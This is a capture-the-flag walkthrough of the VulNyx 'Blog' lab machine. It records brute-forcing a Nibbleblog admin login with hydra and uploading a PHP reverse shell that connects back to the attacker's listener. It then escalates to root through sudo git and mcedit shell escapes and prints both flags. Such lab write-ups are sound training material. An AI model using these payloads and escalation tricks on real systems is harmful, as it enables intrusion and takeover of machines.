# VulNyx - Blog

## Information

## Solution

### Enumeration
#### Nmap
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ nmap -sVC -p- -T4 10.11.5.21
Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-20 14:18 +07
Nmap scan report for 10.11.5.21
Host is up (0.00067s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 56:9b:dd:56:a5:c1:e3:52:a8:42:46:18:5e:0c:12:86 (RSA)
|   256 1b:d2:cc:59:21:50:1b:39:19:77:1d:28:c0:be:c6:82 (ECDSA)
|_  256 9c:e7:41:b6:ad:03:ed:f5:a1:4c:cc:0a:50:79:1c:20 (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: Apache/2.4.38 (Debian)
MAC Address: 08:00:27:DD:70:32 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 50.68 seconds
```
![web](/walkthroughs/vulnyx/easy_difficulty/04_blog/web.png)
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ curl "http://10.11.5.21" 
<pre>PING blog.nyx (127.0.1.1) 56(84) bytes of data.
64 bytes from blog.nyx (127.0.1.1): icmp_seq=1 ttl=64 time=0.019 ms

--- blog.nyx ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.019/0.019/0.019/0.000 ms
</pre>    
```

#### Gobuster
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ gobuster dir -u http://10.11.5.21/ -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.11.5.21/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/my_weblog            (Status: 301) [Size: 312] [--> http://10.11.5.21/my_weblog/]
/server-status        (Status: 403) [Size: 275]
Progress: 220557 / 220557 (100.00%)
===============================================================
Finished
===============================================================
```

![my web-blog](/walkthroughs/vulnyx/easy_difficulty/04_blog/web-blog.png)
                                                             
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ wfuzz -c -t 200 --hc=404 --hl=64 -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt "http://10.11.5.21/my_weblog/FUZZ"
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.11.5.21/my_weblog/FUZZ
Total requests: 220559

=====================================================================
ID           Response   Lines    Word       Chars       Payload              
=====================================================================

000000075:   301        9 L      28 W       320 Ch      "content"            
000000127:   301        9 L      28 W       319 Ch      "themes"             
000000259:   301        9 L      28 W       318 Ch      "admin"              
000000519:   301        9 L      28 W       320 Ch      "plugins"            
000000935:   301        9 L      28 W       322 Ch      "languages"          
000000897:   200        32 L     115 W      902 Ch      "README" 

Total time: 0
Processed Requests: 220559
Filtered Requests: 220553
Requests/sec.: 0 
```

```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ gobuster dir -u http://10.11.5.21/my_weblog/ -w /usr/share/wordlists/dirb/common.txt -x php,txt 
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.11.5.21/my_weblog/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Extensions:              php,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 275]
/.hta.php             (Status: 403) [Size: 275]
/.hta.txt             (Status: 403) [Size: 275]
/.htaccess            (Status: 403) [Size: 275]
/.htaccess.php        (Status: 403) [Size: 275]
/.htaccess.txt        (Status: 403) [Size: 275]
/.htpasswd            (Status: 403) [Size: 275]
/.htpasswd.php        (Status: 403) [Size: 275]
/.htpasswd.txt        (Status: 403) [Size: 275]
/admin                (Status: 301) [Size: 318] [--> http://10.11.5.21/my_weblog/admin/]                                                                                    
/admin.php            (Status: 200) [Size: 1395]
/admin.php            (Status: 200) [Size: 1395]
/content              (Status: 301) [Size: 320] [--> http://10.11.5.21/my_weblog/content/]                                                                                  
/feed.php             (Status: 200) [Size: 993]
/index.php            (Status: 200) [Size: 4303]
/index.php            (Status: 200) [Size: 4303]
/languages            (Status: 301) [Size: 322] [--> http://10.11.5.21/my_weblog/languages/]                                                                                
/LICENSE.txt          (Status: 200) [Size: 35148]
/plugins              (Status: 301) [Size: 320] [--> http://10.11.5.21/my_weblog/plugins/]                                                                                  
/README               (Status: 200) [Size: 902]
/themes               (Status: 301) [Size: 319] [--> http://10.11.5.21/my_weblog/themes/]                                                                                   
Progress: 13839 / 13839 (100.00%)
===============================================================
Finished
===============================================================
```

![nibble-blog](/walkthroughs/vulnyx/easy_difficulty/04_blog/nibbleblog.png)

                                                        
### Shell
#### Hydra
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.11.5.21 http-post-form "/my_weblog/admin.php:username=^USER^&password=^PASS^:Incorrect" -I -f   
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-05-20 15:21:51
[WARNING] Restorefile (ignored ...) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking http-post-form://10.11.5.21:80/my_weblog/admin.php:username=^USER^&password=^PASS^:Incorrect
[STATUS] 43.00 tries/min, 43 tries in 00:01h, 14344356 to do in 5559:50h, 16 active
[STATUS] 31.00 tries/min, 93 tries in 00:03h, 14344306 to do in 7711:60h, 16 active
[STATUS] 22.57 tries/min, 158 tries in 00:07h, 14344241 to do in 10591:45h, 16 active
[80][http-post-form] host: 10.11.5.21   login: admin   password: kisses
[STATUS] attack finished for 10.11.5.21 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-05-20 15:31:22
```
We logged into the website and went to Plugins. We click My image:
![plugins-image](/walkthroughs/vulnyx/easy_difficulty/04_blog/plugins-image.png)

#### Shell (www-data)
We try to upload a shell in My images.
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ cat reverse_shell.php
<?php
$sock = fsockopen("10.11.5.4", 4444);
$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock), $pipes);
?>
```
!![image path](/walkthroughs/vulnyx/easy_difficulty/04_blog/image-path.png)

```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ curl -s "http://10.11.5.21/my_weblog/content/private/plugins/my_image/image.php" 
```
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ nc -lvnp 4444               
listening on [any] 4444 ...
connect to [10.11.5.4] from (UNKNOWN) [10.11.5.21] 46444
/bin/sh: 0: can't access tty; job control turned off
$ id ; hostname
uid=33(www-data) gid=33(www-data) groups=33(www-data)
blog
```
#### Shell (admin)
```bash
$ which python 
/usr/bin/python
$ python -c 'import pty;pty.spawn("/bin/bash")'
www-data@blog:/var/www/html/my_weblog/content/private/plugins/my_image$ cd ~
cd ~
www-data@blog:/var/www$ cd /
cd /
www-data@blog:/$ sudo -l
sudo -l
sudo: unable to resolve host blog: Temporary failure in name resolution
Matching Defaults entries for www-data on blog:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on blog:
    (admin) NOPASSWD: /usr/bin/git
```
```bash
www-data@blog:/$ sudo -u admin /usr/bin/git -p help config
sudo -u admin /usr/bin/git -p help config
sudo: unable to resolve host blog: Temporary failure in name resolution
WARNING: terminal is not fully functional
-  (press RETURN) 
GIT-CONFIG(1)                     Git Manual                     GIT-CONFIG(1)

NAME
       git-config - Get and set repository or global options

SYNOPSIS
       git config [<file-option>] [--type=<type>] [--show-origin] [-z|--null] na
me [value [value_regex]]
       git config [<file-option>] [--type=<type>] --add name value
       git config [<file-option>] [--type=<type>] --replace-all name value [valu
e_regex]
       git config [<file-option>] [--type=<type>] [--show-origin] [-z|--null] --
get name [value_regex]
       git config [<file-option>] [--type=<type>] [--show-origin] [-z|--null] --
get-all name [value_regex]
       git config [<file-option>] [--type=<type>] [--show-origin] [-z|--null] [-
-name-only] --get-regexp name_regex [value_regex]
       git config [<file-option>] [--type=<type>] [-z|--null] --get-urlmatch nam
e URL
       git config [<file-option>] --unset name [value_regex]
       git config [<file-option>] --unset-all name [value_regex]
       git config [<file-option>] --rename-section old_name new_name
       git config [<file-option>] --remove-section name
:!/bin/bash
!//bbiinn//bbaasshh!/bin/bash
admin@blog:/$ id; hostname
id; hostname
uid=1000(admin) gid=1000(admin) groups=1000(admin)
blog
```

### Privileges Escalation
#### Enumeration
```bash
admin@blog:/$ sudo -l
sudo -l
sudo: unable to resolve host blog: Temporary failure in name resolution
Matching Defaults entries for admin on blog:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User admin may run the following commands on blog:
    (root) NOPASSWD: /usr/bin/mcedit
```

#### Abuse
```bash
admin@blog:/$ sudo -u root /usr/bin/mcedit
sudo: unable to resolve host blog: Temporary failure in name resolution
```
We press the alt + F keys and use the arrow keys to navigate to the User menu option.
![user-menu](/walkthroughs/vulnyx/easy_difficulty/04_blog/user-menu.png)
Choose `Invoke 'shell'`.
![shell](/walkthroughs/vulnyx/easy_difficulty/04_blog/shell.png)
```bash
#  /bin/sh /tmp/mc-root/mcusr54YBP3
# id; hostname
uid=0(root) gid=0(root) groups=0(root)
blog
```

#### Flags
**root.txt**
```bash
# cat r0000000000000000000000000t.txt 
6c24e7883470e2c1683df7672576a1f7
```
**user.txt**
```bash
admin@blog:/$ find / -name user.txt 2>/dev/null |xargs cat
1385bbd4fcdb68d2cc5d5204f97d4a80
```

***You are welcome!***
